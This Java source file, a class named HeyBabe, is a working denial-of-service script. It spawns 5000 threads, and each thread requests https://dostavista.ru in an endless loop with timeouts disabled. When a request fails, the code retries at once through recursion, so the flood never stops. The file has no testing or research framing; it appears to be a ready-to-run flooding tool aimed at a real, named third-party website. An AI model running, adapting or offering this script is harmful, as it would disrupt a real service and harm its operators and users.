import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;

import static java.util.Objects.nonNull;

public class HeyBabe implements Runnable {

    public static void main(String[] args) {
        extracted();
    }

    private static void extracted() {
        for (int i = 0; i < 5000; i++) {
            final HeyBabe heyBabe = new HeyBabe();
            final Thread thread = new Thread(heyBabe);

            thread.start();
        }
    }

    public static void hey() {
        Unirest.setTimeouts(0, 0);
        HttpResponse<String> response = null;
        try {
            response = Unirest.get("https://dostavista.ru")
                    .asString();
            if (nonNull(response) && response.getStatus() == 200) {
                System.out.println("Status code " + response.getStatus());
            } else {
                if (nonNull(response)) {
                    System.err.println("Status code --------> " + response.getStatus());
                } else {
                    System.err.println("--------> Status code is undefined");
                }
            }
        } catch (Exception e) {
            hey();
            if (nonNull(response)) {
                System.err.println("E Status code --------> " + response.getStatus());
            } else {
                System.err.println("E --------> Status code is undefined");
            }
        }
    }

    public static void loop() {
        try {
            while (true) {
                hey();
            }
        } catch (Exception e) {
            while (true) {
                hey();
            }
        }
    }

    @Override
    public void run() {
        try {
            loop();
        } catch (Exception e) {
            loop();
        }
    }
}
